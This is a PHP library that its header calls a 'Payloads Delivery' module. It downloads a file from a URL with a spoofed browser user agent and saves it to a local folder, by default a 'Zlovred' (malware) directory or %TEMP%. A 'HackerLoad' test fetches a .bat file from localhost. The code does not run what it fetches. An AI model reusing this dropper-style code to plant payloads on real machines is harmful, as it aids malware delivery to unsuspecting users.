#!php.exe
<?php
###
# LIB_FUNC.PHP
# This file contain main modules for Payloads Delivery
#
# Revision 1.1.0.0 (Extended Beta) May be Present
# The Library Links at lib_func-1.0.0.php
# 
# Version 1.1.1.0 (Extended Beta) Build 0001
#
###

###
# getTempEnviron()
#
# This Function Returns the Path for ZLOVRED Directory or Path for User Variable TEMP
#
# PARAMETERS:   NONE
# RETURNS:      Path for Zlovred Directory if Exists or
#               Path for User Variable %TEMP% if Success or
#		"" if General System Error
###

function getTempEnviron(){
    $path1 = "c:\\pub1\\Distrib\\Zlovred";
    $path2 = $_SERVER['TEMP'];
    if(is_dir($path1))
        return $path1;
    elseif(is_dir($path2)) {
        return $path2;
    }
    else
        return "";
}

###
# get_responce_code
###
function get_response_code($domain) {
    $headers = get_headers($domain);
    return substr($headers[0], 9, 3);
}

###
# remoteFileExists($url)
###
function remoteFileExists($url) {
    $curl = curl_init($url);
    $config['useragent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, $config['useragent']);

    //don't fetch the actual page, you only want to check the connection is ok
    curl_setopt($curl, CURLOPT_NOBODY, true);

    //do request
    $result = curl_exec($curl);

    $ret = false;

    //if request did not fail
    if ($result !== false) {
        //if request was ok, check response code
        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);  

        if ($statusCode == 200) {
            $ret = true;   
        }
    }

    curl_close($curl);

    return $ret;
}

###
# UploadFilesFromInt( strFile, strURL, strPath )
# This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
# and Save it on Local Computer to Path strPath
# Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
#
# PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
#               strURL -- an URL of the web-site, from which the File
#               is Downloaded
#               strPath -- a Place in a Windows Computer (Full path without slash)
#               in which the File is Downloaded
#
# RETURNS:      0 -- If File is Normally Downloaded and Created
#               1 -- if File in Path strPath Can't Create
#               2 -- if XMLHTTP or ADOStream Can't Initialize
#				3 -- if Emty HTTP Responce or Send Access Denied
#				4 -- if HTTP Response Not 200 (while is not make)
#
###

function uploadFilesFromInt( $strFile, $strURL, $strPath ) {
    $strFileURL = $strURL . $strFile;
    $strLocal_Path = $strPath . "\\" . $strFile;
    $intUploadFilesFromInt = 0;
    $blnExistRemoteFile = true;
    if(is_dir($strPath))
        $intUploadFilesFromInt = 0;
    else{
        $intUploadFilesFromInt = 1;
        echo("\nWrong Path: " . $strPath);
    }
    if( !remoteFileExists($strFileURL)) {
        echo("\nCan't open URL: " . $strFileURL . "\nConnection Error");
        return 3;
    }
    $resp = get_response_code($strFileURL);
    if( $resp != "200") {
        $blnExistRemoteFile = false;
        $intUploadFilesFromInt = 4;
        echo("\nWrong HTTP Status: " + $resp + "\nURL = " . $strFileURL);
    }
    else
        $blnExistRemoteFile = true;
    if($blnExistRemoteFile){
        $aContent = file_get_contents($strFileURL);
        if(!is_dir($strPath) or !is_writable($strPath)) {
            echo("\nCan't Write to Path: ". $strPath);
            return 1;
        }
        elseif(is_file($strLocal_Path) and !is_writable($strLocal_Path)) {
            echo("\nCan't Create a File: " . $strLocal_Path);
            return 1;
        }
        elseif(empty($aContent)) {
            echo("\nError! Empty Request.");
            return 3;
        }
        else {
            file_put_contents($strLocal_Path, $aContent);
            return 0;
        }
    }
    else
        return $intUploadFilesFromInt;
}


### Tests

function HackerLoad(){
    $aFolder = getcwd();
#    $aFolder = "A:";
#    $aFolder = dirname(__FILE__);
#   $aFolder = getTempEnviron();;
    $anURL = "http://localhost/";
    $aFile = "echo.bat";
    echo( "\niFlag=" . uploadFilesFromInt( $aFile, $anURL, $aFolder));
}

HackerLoad();


echo("\nTempdir = " . getTempEnviron() . "\n");

?>